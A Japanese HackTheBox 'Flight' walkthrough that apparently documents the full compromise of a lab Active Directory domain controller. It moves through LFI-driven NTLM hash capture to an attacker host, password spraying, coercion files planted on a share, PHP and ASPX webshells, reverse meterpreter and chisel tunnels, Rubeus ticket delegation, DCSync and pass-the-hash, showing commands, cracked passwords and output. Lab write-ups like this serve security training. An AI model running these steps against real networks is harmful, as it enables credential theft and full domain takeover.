---
title: "[Hard] Flight - HackTheBox Walkthrough"
emoji: "✈️"
type: "tech"
topics: ["hackthebox", "windows", "activedirectory", "pentest"]
published: true
---

# TL;DR

1. **LFI → NTLMハッシュ窃取**: `school.flight.htb`のLFI脆弱性を悪用し、UNCパスでResponderを使ってNTLMハッシュを取得
1. **ntlm_theft**: SMB共有にntlm_theftで生成したファイルをアップロードし、追加のクレデンシャルを窃取
1. **RunasCs**: 非対話型シェルで`RunasCs`を使ってユーザーを切り替え、user flagを取得
1. **IIS仮想アカウント**: `IIS APPPOOL\DefaultAppPool`がマシンアカウント`G0$`として振る舞う

---

# Enumeration

## Port Scan

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
```

Kerberos(88)やLDAP(389)のポートが開いているので、Active Directory環境のドメインコントローラーであることが分かります。

## Web Enumeration (80/tcp)

エアラインの予約ページが表示されます。フッターに`flight.htb`のドメイン情報が見つかるのでhostsファイルに追記します。

![Webインデックスページ](/images/htb-flight-hard/web_index.png)

## VHOST Fuzzing

gobusterでVHOSTをfuzzingすると、`school.flight.htb`が見つかります。発見したvhostもサブドメインに追記しておきます。

```bash
$ gobuster vhost -u http://flight.htb/ -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --ad --rua
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
school.flight.htb Status: 200 [Size: 3996]
```

## Web Walk - school.flight.htb

`school.flight.htb`にアクセスすると、航空学校のWebサイトが表示されます。

![school.flight.htb](/images/htb-flight-hard/school_web.png)



## LFI脆弱性の発見

`school.flight.htb`の`index.php`にある`view`パラメータにLFI（Local File Inclusion）の脆弱性がありました。

[SecListsのLFI-Windows-adeadfed.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Windows-adeadfed.txt)を使ってFuzzingした結果、UNCパス（`//127.0.0.1/C$/...`）を使ったリクエストが通ることを確認しました。

```http
GET /index.php?view=//127.0.0.1/C$/Windows/system32/drivers/etc/hosts HTTP/1.1
Host: school.flight.htb
```

---

# Exploit - User Flag

## NTLMハッシュの窃取

Responderを起動し、自端末のIPアドレスをペイロードに入れてリクエストを送信します。

```http
GET /index.php?view=//10.10.14.17/test HTTP/1.1
Host: school.flight.htb
```

Responderで`svc_apache`ユーザーのNTLMv2ハッシュを取得できました。

```
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:d83ab89237f53c47:...
```

hashcatでクラックに成功しました。

```
svc_apache:S@Ss!K@*t13
```

## パスワード再利用の発見

netexecでパスワードスプレー攻撃を行うと、`S.Moon`ユーザーも同じパスワードを使っていることがわかりました。

```bash
$ netexec smb flight.htb -u userlist.txt -p 'S@Ss!K@*t13' --continue-on-success
SMB   flight.htb   [+] flight.htb\S.Moon:S@Ss!K@*t13
```

## SMB共有への書き込み

`S.Moon`は`Shared`フォルダに書き込み権限を持っています。

```bash
$ netexec smb flight.htb -u 'S.Moon' -p 'S@Ss!K@*t13' --shares
Share           Permissions     Remark
Shared          READ,WRITE
```

[ntlm_theft](https://github.com/Greenwolf/ntlm_theft)を使って、自端末にSMBリクエストを送るファイルを作成し、Sharedフォルダにアップロードします。

```bash
$ python3 ntlm_theft.py -g all -s 10.10.14.17 -f '@myfile'
```
権限の問題でアップロードできないものもありますが、いくつかは正常にアップロードできました。
```bash
$ sudo mkdir -p /mnt/flight_shared
[sudo] password for dash: 
$ sudo mount -t cifs '//flight.htb/Shared' /mnt/flight_shared \
  -o username=S.Moon,password='S@Ss!K@*t13',domain=flight.htb,uid=$(id -u),gid=$(id -g)
mount: /mnt/flight_shared: mount(2) system call failed: No route to host.
       dmesg(1) may have more information after failed mount system call.
$ sudo mount -t cifs '//10.129.228.120/Shared' /mnt/flight_shared -o username=S.Moon,password='S@Ss!K@*t13',domain=flight.htb,uid=$(id -u),gid=$(id -g)
$ ls /mnt/flight_shared/
$ cp @myfile/* /mnt/flight_shared/
cp: cannot create regular file '/mnt/flight_shared/@myfile-(externalcell).xlsx': Permission denied
cp: cannot create regular file '/mnt/flight_shared/@myfile-(frameset).docx': Permission denied
cp: cannot create regular file '/mnt/flight_shared/@myfile-(handler).htm': Permission denied
cp: cannot create regular file '/mnt/flight_shared/@myfile-(icon).url': Permission denied
cp: cannot create regular file '/mnt/flight_shared/@myfile-(includepicture).docx': Permission denied
cp: cannot create regular file '/mnt/flight_shared/@myfile-(remotetemplate).docx': Permission denied
cp: cannot create regular file '/mnt/flight_shared/@myfile-(url).url': Permission denied
cp: cannot create regular file '/mnt/flight_shared/@myfile.asx': Permission denied
cp: cannot create regular file '/mnt/flight_shared/@myfile.htm': Permission denied
cp: cannot create regular file '/mnt/flight_shared/@myfile.lnk': Permission denied
cp: cannot create regular file '/mnt/flight_shared/@myfile.m3u': Permission denied
cp: cannot create regular file '/mnt/flight_shared/@myfile.pdf': Permission denied
cp: cannot create regular file '/mnt/flight_shared/@myfile.rtf': Permission denied
cp: cannot create regular file '/mnt/flight_shared/@myfile.scf': Permission denied
cp: cannot create regular file '/mnt/flight_shared/@myfile.wax': Permission denied
cp: cannot create regular file '/mnt/flight_shared/Autorun.inf': Permission denied
cp: cannot create regular file '/mnt/flight_shared/zoom-attack-instructions.txt': Permission denied
dash@daaash:~/htb/flight$ ls /mnt/flight_shared/
'@myfile-(fulldocx).xml'  '@myfile-(stylesheet).xml'   @myfile.application   @myfile.jnlp   @myfile.library-ms   @myfile.theme   desktop.ini
```

Responderで待機していると、`C.Bum`ユーザーのハッシュを取得できました。

```
[SMB] NTLMv2-SSP Client   : 10.129.228.120
[SMB] NTLMv2-SSP Username : flight.htb\c.bum
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:7534227eccf21fcc:BB50B41247D747F7A5CFCFC9F792AAE3:010100000000000000ED0A76BA5DDC015BFEC46BF9A878D200000000020008005000570030004F0001001E00570049004E002D005100480034003100510052004400300057004300430004003400570049004E002D00510048003400310051005200440030005700430043002E005000570030004F002E004C004F00430041004C00030014005000570030004F002E004C004F00430041004C00050014005000570030004F002E004C004F00430041004C000700080000ED0A76BA5DDC0106000400020000000800300030000000000000000000000000300000F1C3E1AB9782F89C6869DCF7C957A095D3B0A3526A7E99C52C1513F7569D332F0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310037000000000000000000
```

hashcatでクラックに成功しました。(Tikkycoll_431012284)

```
C.BUM::flight.htb:7534227eccf21fcc:bb50b41247d747f7a5cfcfc9f792aae3:010100000000000000ed0a76ba5ddc015bfec46bf9a878d200000000020008005000570030004f0001001e00570049004e002d005100480034003100510052004400300057004300430004003400570049004e002d00510048003400310051005200440030005700430043002e005000570030004f002e004c004f00430041004c00030014005000570030004f002e004c004f00430041004c00050014005000570030004f002e004c004f00430041004c000700080000ed0a76ba5ddc0106000400020000000800300030000000000000000000000000300000f1c3e1ab9782f89c6869dcf7c957a095d3b0a3526a7e99c52c1513f7569d332f0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310037000000000000000000:Tikkycoll_431012284
```


## Webシェルの設置

`C.Bum`は`Web`フォルダに書き込み権限があります。ここはWebアプリで公開されているフォルダです。

```bash
$ netexec smb flight.htb -u C.Bum -p 'Tikkycoll_431012284' --shares
Share           Permissions
Web             READ,WRITE
```

PHPのWebシェルをアップロードしてRCEを獲得します。

```bash
smb: \school.flight.htb\> put shell.php
```

Webシェルにアクセスすると、`whoami`コマンドでユーザー確認ができます。

![Webシェル - whoami](/images/htb-flight-hard/webshell_whoami.png)

`dir`コマンドで現在のディレクトリパス（`C:\xampp\htdocs\school.flight.htb`）も確認できました。

![Webシェル - dir](/images/htb-flight-hard/webshell_dir.png)

smbclientで送り込んだ実行ファイルを叩きます。

![Webシェルからrev.exeを実行](/images/htb-flight-hard/webshell_rev.png)

meterpreterシェルをゲット出来ました。

```bash
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.17:7777 
[*] Sending stage (230982 bytes) to 10.129.228.120
[*] Meterpreter session 1 opened (10.10.14.17:7777 -> 10.129.228.120:53114) at 2025-11-25 07:24:49 +0000
```


## 横展開 - RunasCsの利用

meterpreterシェルを取得後、`C.Bum`に横展開を試みます。

通常の`runas.exe`ではパスワードを対話的に入力する必要がありますが、非対話型シェルでは使えません。[RunasCs](https://github.com/antonioCoco/RunasCs)を使うと、パスワードをコマンドライン引数として渡せます。

```powershell
C:\Users\Public\Downloads\RunasCs.exe "C.Bum" "Tikkycoll_431012284" "C:\path\to\rev.exe"
```

これで`C.Bum`としてリバースシェルを取得し、ユーザーフラグを獲得できました。

```
PS C:\Users\C.bum\Desktop> type user.txt
ec1e***********************82d26
```

---

# Internal Enumeration

## 内部ポートの発見

WinPEASを実行すると、外部からアクセスできない8000/tcpでSystemとして動作しているサービスを発見しました。

```
TCP        0.0.0.0               8000          Listening         4               System
```

## Chiselでのポートフォワーディング

chiselを使って8000/tcpを自端末にフォワードします。

**攻撃端末:**
```bash
$ chisel server -p 18080 --reverse
```

**ターゲット端末:**
```powershell
./chisel.exe client 10.10.14.11:18080 R:28000:127.0.0.1:8000
```

http://localhost:28000にアクセスすると、IISで動作しているWebアプリケーションを発見しました。

Webコンテンツは`C:\inetpub\development`にあり、[ASPXのWebシェル](https://github.com/danielmiessler/SecLists/blob/master/Web-Shells/FuzzDB/cmd.aspx)をアップロードしてRCEを取得しました。

```powershell
meterpreter > upload cmd.aspx
```

ブラウザからアクセスすると、アップロードしたASPXウェブシェルが表示されます。

![ASPXウェブシェル](/images/htb-flight-hard/aspx-webshell.png)

先ほどと同様の方法でリバースシェルを取得します。

```
meterpreter > getuid
Server username: IIS APPPOOL\DefaultAppPool
```

残念ながらSystem権限ではありませんでした。

---

# Exploit - Root Flag (想定外の解法)

meterpreterの`getsystem`コマンドでSystem権限が取れてしまいました。

```
meterpreter > getuid 
Server username: IIS APPPOOL\DefaultAppPool
meterpreter > getsystem 
...got system via technique 6 (Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)).
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM

meterpreter > dir
Listing: c:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2022-06-07 15:14:48 +0000  desktop.ini
100444/r--r--r--  34    fil   2025-12-03 11:28:07 +0000  root.txt

meterpreter > cat root.txt 
c3f0d***********************5b83d4
```

これは想定解ではないと思われるので、正攻法も試してみます。

---

# Exploit - Root Flag (想定解)

## IIS仮想アカウントの特性

`IIS APPPOOL\DefaultAppPool`アカウントは通常のWindowsユーザーアカウントではなく、IISによって動的に管理される**仮想アカウント**です。ウェブアプリケーションの実行に必要な**最小限のアクセス権**のみを提供しています。

Microsoftの設計上、**仮想アカウントとして実行されるサービス**は、ネットワークリソースにアクセスする際、**自分自身のユーザー名を使わず**、代わりに**コンピューターアカウント**の資格情報を使用します。

つまり、`IIS APPPOOL\DefaultAppPool`アカウントは、ネットワーク上では**IISサーバー自身のマシンアカウント**として振る舞います。ドメイン名とコンピューター名に`$`（ドルマーク）を付けた形式になります。これは、サーバー自体がネットワークに登録されている特殊なアカウントで、**Active Directory内で特権を持つことがあります**。

## マシンアカウントの特権確認

`net view`コマンドで自端末を探してみます。

```powershell
c:\windows\system32\inetsrv>net view \\10.10.14.31\share
net view \\10.10.14.31\share
System error 5 has occurred.

Access is denied.
```

Responderで待ち受けていると、IIS APPPOOLアカウントはネットワーク上でG0アカウントで振る舞うことが分かります。ハッシュ値も手に入りました。

```
[SMB] NTLMv2-SSP Client   : 10.129.18.44
[SMB] NTLMv2-SSP Username : flight\G0$
[SMB] NTLMv2-SSP Hash     : G0$::flight:73f767809525a214:04C519DBB80DEC5093540B5CB28C938F:010100000000000080D12BAE1865DC0191FA521C8E09B000000000000200080036004A005500330001001E00570049004E002D004E0045004500420045004700310044005A005900460004003400570049004E002D004E0045004500420045004700310044005A00590046002E0036004A00550033002E004C004F00430041004C000300140036004A00550033002E004C004F00430041004C000500140036004A00550033002E004C004F00430041004C000700080080D12BAE1865DC0106000400020000000800300030000000000000000000000000300000BBB079A9311944D2C958A65AD61D26BAA7898CEB18525B086F02CF33E6D8503C0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00330031000000000000000000
```

BloodHoundで確認すると、`G0$`アカウントは特権を持っていることが分かりました。

![G0アカウントの権限](/images/htb-flight-hard/g0-acl.png)

## Rubeusでチケット取得

現在の低特権セッション（IIS APPPOOL）から、**Rubeus**を使ってマシンアカウントとして認証チケットを要求します。

```powershell
c:\Windows\Temp>C:\xampp\htdocs\school.flight.htb\images\Rubeus.exe tgtdeleg /nowrap
   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/g0.flight.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: 8J/n5Q43HjWALbK1opks4IDbVrBDk/8N1KGxJmhe5E4=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIFVDCCBVCgAwIBBaEDAgEWooIEZDCCBGBhggRcMIIEWKADAgEFoQwbCkZMSUdIVC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkZMSUdIVC5IVEKjggQgMIIEHKADAgESoQMCAQKiggQOBIIECu+XiFr/sjejo24wmPs7YHrKce7jze+FISqbloRo9MAnbLtTQ6jqvVvbAGEJxiBHdeVrFcdV2qG4IlmN7Y3U6tJe2VFpHXCZm/a/l6bTaGeUO9YCsIIuAgJRoPoy5nYYZzSdEdRkNaxxGxvinBcN8ZLS9cDSqikalJAAC8HoqIZrpsNe+gbebba7je9mQqE7YIi6PBc13ZO8QW4Qd6+Nr4YYK/LCln8qqRpuZ3zjYB3KyZAptA+0PoIA3FNDyYRIHNbhqyz0Bqp8zx6AVvOPe8UWt1UIAj9YtehNZJeFr9fgXwo92ry60FMa1y4g+R8fhXbNl2vuVnU4WgojRC4n0+l9pFXj4K3+GfjaJI68vp5YYj/Sfb+JUYGLCV7rhkygzBbVmx73uYQ1JyfG/YP8GUWxUGtiy/QrZPWXXDEDm9EYY97pUl6V/EPnI+f4DWjt3k4VwL00sdXZ9CuBTtX3dlVlHNkc6AIytgzRNRnc0RYnMj/t3AiUkbzHlb2VqFFutst18geRuPtbh93aUE0MwgI/cpslbMFrrTiuX2/yiTelpAOvaU+c7zWGQqbgdrisNaO+aY/8CNQFTv3Ffw4BRQcnqwEfgHap29T5FwO3G4o0ycxTvQOds8APJw2ccnv6HLHU9LOIjaDEnYlti8hUUWhQXt/93AcaCFUt8CfEqTqDtB6dq16GIUnjk+h9aqRYJQoUx4T7S6eF6JeHZpmKkS8kFmoaWhMztyv8YjJK2JDvZRTO63UUXZPXCuLyRscEv8vGBuRS1hnxtggjwghEYkxahRpK0wOBnYJ1o5YgTiCdEdJ+BHMpD8yycfFcXPc8HbfUuNpyzec3NMp9lC/kcVmkgfUZVcT20iUwaypwvYh4/oYQSwuWvlQ0GAS3ODvlWNRJ21IV2iB1VY4wPq44+sZxaQ2e+6Vd8scGN6pd7XtlylVmkcD43QeuOm5LYBH4bUJwsn3WjsF1MQ3+RAk4caadpfHf6cswBhMDEV2Zd4N6HpHU8yXZc62pw3tbpIvpRBIFvjoxHp2pKU2S4FZl4swt/y1K4Tpm52KnVZTE4WjeHyEuOPbbkwOFjfqoUz64LKiS2xUhhAx5UexjVlGHsjKhYN8O4fHGZuS+24n+tu/B+04JhH53wwI4HzyB25MTnBph2SAqaHjJOOg5GT44rVDvkjtomBN5oiQEQtrBonuk1n0sSaq+yiKowhr+A00CPZc/r6U2nZUV3DLxwUlt5I8vrtCErG52hsZXeNXWcFZ2EuBevrO8Sc0G8//fhXCyuHokrJOsWRJRMgTSeNQ/M88lE/pbHRrCWng+K1qjWFxWdXaXRxaUdrOXLacc9z6HzFWq6hsPXDlRwRZcx6zaaWuBaMG4KkJDB9uMo4HbMIHYoAMCAQCigdAEgc19gcowgceggcQwgcEwgb6gKzApoAMCARKhIgQgghfe0GodBYl62j46wTM6iBFymBNH7D4hmP1lejjmKCahDBsKRkxJR0hULkhUQqIQMA6gAwIBAaEHMAUbA0cwJKMHAwUAYKEAAKURGA8yMDI1MTIwNDEwNDI1MFqmERgPMjAyNTEyMDQyMDQyNTBapxEYDzIwMjUxMjExMTA0MjUwWqgMGwpGTElHSFQuSFRCqR8wHaADAgECoRYwFBsGa3JidGd0GwpGTElHSFQuSFRC
```

base64エンコードされたチケットが出力されます。

## チケット変換とDCSync

取得したbase64エンコードされたチケットをファイルに保存します。

```bash
$ cat ticket.kirbi_encoded.txt
doIFVDCCBVCgAwIBBaEDAgEWooIEZDCCBGBhggRcMIIEWKADAgEFoQwbCkZMSUdIVC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkZMSUdIVC5IVEKjggQgMIIEHKADAgESoQMCAQKiggQOBIIECu+XiFr/sjejo24wmPs7YHrKce7jze+FISqbloRo9MAnbLtTQ6jqvVvbAGEJxiBHdeVrFcdV2qG4IlmN7Y3U6tJe2VFpHXCZm/a/l6bTaGeUO9YCsIIuAgJRoPoy5nYYZzSdEdRkNaxxGxvinBcN8ZLS9cDSqikalJAAC8HoqIZrpsNe+gbebba7je9mQqE7YIi6PBc13ZO8QW4Qd6+Nr4YYK/LCln8qqRpuZ3zjYB3KyZAptA+0PoIA3FNDyYRIHNbhqyz0Bqp8zx6AVvOPe8UWt1UIAj9YtehNZJeFr9fgXwo92ry60FMa1y4g+R8fhXbNl2vuVnU4WgojRC4n0+l9pFXj4K3+GfjaJI68vp5YYj/Sfb+JUYGLCV7rhkygzBbVmx73uYQ1JyfG/YP8GUWxUGtiy/QrZPWXXDEDm9EYY97pUl6V/EPnI+f4DWjt3k4VwL00sdXZ9CuBTtX3dlVlHNkc6AIytgzRNRnc0RYnMj/t3AiUkbzHlb2VqFFutst18geRuPtbh93aUE0MwgI/cpslbMFrrTiuX2/yiTelpAOvaU+c7zWGQqbgdrisNaO+aY/8CNQFTv3Ffw4BRQcnqwEfgHap29T5FwO3G4o0ycxTvQOds8APJw2ccnv6HLHU9LOIjaDEnYlti8hUUWhQXt/93AcaCFUt8CfEqTqDtB6dq16GIUnjk+h9aqRYJQoUx4T7S6eF6JeHZpmKkS8kFmoaWhMztyv8YjJK2JDvZRTO63UUXZPXCuLyRscEv8vGBuRS1hnxtggjwghEYkxahRpK0wOBnYJ1o5YgTiCdEdJ+BHMpD8yycfFcXPc8HbfUuNpyzec3NMp9lC/kcVmkgfUZVcT20iUwaypwvYh4/oYQSwuWvlQ0GAS3ODvlWNRJ21IV2iB1VY4wPq44+sZxaQ2e+6Vd8scGN6pd7XtlylVmkcD43QeuOm5LYBH4bUJwsn3WjsF1MQ3+RAk4caadpfHf6cswBhMDEV2Zd4N6HpHU8yXZc62pw3tbpIvpRBIFvjoxHp2pKU2S4FZl4swt/y1K4Tpm52KnVZTE4WjeHyEuOPbbkwOFjfqoUz64LKiS2xUhhAx5UexjVlGHsjKhYN8O4fHGZuS+24n+tu/B+04JhH53wwI4HzyB25MTnBph2SAqaHjJOOg5GT44rVDvkjtomBN5oiQEQtrBonuk1n0sSaq+yiKowhr+A00CPZc/r6U2nZUV3DLxwUlt5I8vrtCErG52hsZXeNXWcFZ2EuBevrO8Sc0G8//fhXCyuHokrJOsWRJRMgTSeNQ/M88lE/pbHRrCWng+K1qjWFxWdXaXRxaUdrOXLacc9z6HzFWq6hsPXDlRwRZcx6zaaWuBaMG4KkJDB9uMo4HbMIHYoAMCAQCigdAEgc19gcowgceggcQwgcEwgb6gKzApoAMCARKhIgQgghfe0GodBYl62j46wTM6iBFymBNH7D4hmP1lejjmKCahDBsKRkxJR0hULkhUQqIQMA6gAwIBAaEHMAUbA0cwJKMHAwUAYKEAAKURGA8yMDI1MTIwNDEwNDI1MFqmERgPMjAyNTEyMDQyMDQyNTBapxEYDzIwMjUxMjExMTA0MjUwWqgMGwpGTElHSFQuSFRCqR8wHaADAgECoRYwFBsGa3JidGd0GwpGTElHSFQuSFRC
```

base64デコードしてkirbi形式のファイルを作成します。

```bash
$ cat ticket.kirbi_encoded.txt | base64 -d | tee ticket.kirbi
```

ImpacketのticketConverter.pyを使ってkirbi形式からccache形式に変換します。

```bash
$ python3 /opt/impacket/examples/ticketConverter.py ticket.kirbi g0.ccache
Impacket v0.14.0.dev0+20251203.31101.caba5fac - Copyright Fortra, LLC and its affiliated companies

[*] converting kirbi to ccache...
[+] done
```

環境変数`KRB5CCNAME`に変換したccacheファイルのパスを設定します。

```bash
$ export KRB5CCNAME=./g0.ccache
```

`klist`コマンドでチケットが正しく読み込めたことを確認します。

```bash
$ klist
Ticket cache: FILE:./g0.ccache
Default principal: G0$@FLIGHT.HTB

Valid starting     Expires            Service principal
12/04/25 19:42:50  12/05/25 05:42:50  krbtgt/FLIGHT.HTB@FLIGHT.HTB
	renew until 12/11/25 19:42:50
```

BloodHoundの手順に従ってDCSync攻撃を実行します。

![DCSync攻撃の手順](/images/htb-flight-hard/dcsync.png)

DCSync攻撃でAdministratorのハッシュを取得します。

```bash
$ secretsdump.py -k -just-dc-user flight.htb/Administrator flight.htb
Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::
```

## シェル取得

取得したハッシュを使ってpsexecでSystem権限のシェルを取得します。

```bash
$ psexec.py administrator@flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c

C:\Windows\system32> whoami
nt authority\system

C:\Users\Administrator\Desktop> type root.txt
8716e5********************2781e
```

Root flagを獲得しました！
